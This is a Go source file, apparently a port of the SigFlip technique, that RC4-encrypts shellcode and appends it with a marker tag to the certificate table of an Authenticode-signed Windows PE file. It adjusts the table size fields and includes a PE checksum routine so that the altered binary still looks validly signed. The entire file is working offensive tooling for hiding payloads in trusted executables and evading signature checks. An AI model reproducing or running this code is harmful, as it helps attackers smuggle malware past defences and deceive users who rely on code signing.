package gSigFlip

import (
	"bytes"
	"crypto/rc4"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math"
)

func getPENtHeaderOffset(fileBytes []byte) uint64 {
	ntHeaderOffsetBytes := fileBytes[0x3C:0x40]
	ntHeaderOffset := binary.LittleEndian.Uint32(ntHeaderOffsetBytes)
	return uint64(ntHeaderOffset)
}

func GeneratePECheckSum(fileBytes []byte) uint32 {
	// get checksum offset
	ntHeaderOffset := getPENtHeaderOffset(fileBytes)
	checksumOffset := ntHeaderOffset + 0x58

	var checksum uint64 = 0
	top := uint64(math.Pow(2, 32))

	for i := 0; i < len(fileBytes)/4; i++ {
		if i == int(checksumOffset/4) {
			continue
		}
		dword := binary.LittleEndian.Uint32(fileBytes[i*4 : (i*4)+4])
		checksum = (checksum & 0xffffffff) + uint64(dword) + (checksum >> 32)
		if checksum > top {
			checksum = (checksum & 0xffffffff) + (checksum >> 32)
		}
	}

	checksum = (checksum & 0xffff) + (checksum >> 16)
	checksum = (checksum) + (checksum >> 16)
	checksum = checksum & 0xffff

	checksum += uint64(len(fileBytes))
	return uint32(checksum)
}

// Is32BitPE determine if the pe file is 32bit
func Is32BitPE(fileBytes []byte) bool {
	ntHeaderOffset := getPENtHeaderOffset(fileBytes)
	characteristicsOffset := ntHeaderOffset + 0x16
	characteristicsBytes := fileBytes[characteristicsOffset : characteristicsOffset+2]
	characteristics := binary.LittleEndian.Uint16(characteristicsBytes)
	return characteristics&0x0100 == 0x0100
}

// GetCertTableOffset get the location of the certificate form in the file
func GetCertTableOffset(fileBytes []byte) uint64 {
	ntHeaderOffset := getPENtHeaderOffset(fileBytes)
	var certTblOffsetFromNtHeader uint64 = 0xA8
	if Is32BitPE(fileBytes) {
		certTblOffsetFromNtHeader = 0x98
	}
	return ntHeaderOffset + certTblOffsetFromNtHeader
}

// Inject tag and shellcode to pe cert table, tag length must be at least 8
func Inject(fr io.Reader, shellcode []byte, tag []byte, rc4key []byte) (newFileBytes []byte, err error) {
	if len(tag) < 8 {
		err = errors.New("tag length must be at least 8")
		return
	}
	var fileBytes []byte
	fileBytes, err = ioutil.ReadAll(fr)
	if err != nil {
		return
	}

	// RC4 encrypt and Tag
	rc4Cipher, err := rc4.NewCipher(rc4key)
	if err != nil {
		return
	}
	encryptedShellcode := make([]byte, len(shellcode))
	rc4Cipher.XORKeyStream(encryptedShellcode, shellcode)
	encryptedData := append(tag, encryptedShellcode...)

	// Adjust extra padding
	extraPaddingCount := 0
	if len(fileBytes)+len(encryptedData)%8 != 0 {
		for (len(fileBytes)+len(encryptedData)+extraPaddingCount)%8 != 0 {
			extraPaddingCount += 1
		}
		extraPadding := make([]byte, extraPaddingCount)
		encryptedData = append(encryptedData, extraPadding...)
	}

	var pefile *pe.File
	pefile, err = pe.NewFile(bytes.NewReader(fileBytes))
	if err != nil {
		return
	}

	// DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress actually mean file offset
	// https://social.msdn.microsoft.com/Forums/windows/en-US/29d3a40b-844e-49a5-b436-3aff929dba30/does-datadirectoryimagedirectoryentrysecurityvirtualaddress-actually-mean-file-offset?forum=windowssdk
	var certTableFOA uint32
	var certTableSize uint32
	switch t := pefile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		certTableFOA = t.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
		certTableSize = t.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY].Size
	case *pe.OptionalHeader64:
		certTableFOA = t.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
		certTableSize = t.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_SECURITY].Size
	}
	if certTableFOA == 0 {
		err = fmt.Errorf("This file is not signed")
		return
	}
	// update the size in the cert table
	certTableOffset := GetCertTableOffset(fileBytes)
	newCertTableSize := uint32(len(encryptedData)) + certTableSize
	binary.LittleEndian.PutUint32(fileBytes[certTableOffset+4:certTableOffset+8], newCertTableSize)
	binary.LittleEndian.PutUint32(fileBytes[certTableFOA:certTableFOA+4], newCertTableSize)

	newFileBytes = append(fileBytes, encryptedData...)
	return
}
